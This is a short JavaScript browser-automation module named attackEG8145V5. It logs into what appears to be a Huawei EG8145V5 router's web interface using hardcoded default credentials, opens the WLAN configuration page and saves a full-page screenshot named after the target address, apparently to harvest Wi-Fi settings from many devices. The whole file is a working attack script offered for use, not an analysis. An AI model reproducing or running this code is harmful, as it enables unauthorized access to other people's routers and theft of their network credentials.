export default async function attackEG8145V5(page, endereco) {
    {
        await page.focus("#txt_Username");
        await page.keyboard.type("Epadmin");
    }
    {
        await page.focus("#txt_Password");
        await page.keyboard.type("adminEp");
    }
    {
        await page.click("#loginbutton")
    }
    {
        await page.waitForTimeout(5000);
        await page.click("#name_addconfig")
    }
    {
        await page.click("#name_wlanconfig");
    }
    {
        await page.waitForTimeout(5000);
        const enderecoUrlFoto = endereco
            .replace("http://", "");

        await page.screenshot({
            path: `./fotos/${enderecoUrlFoto}.png`,
            fullPage: true
        });
    }
}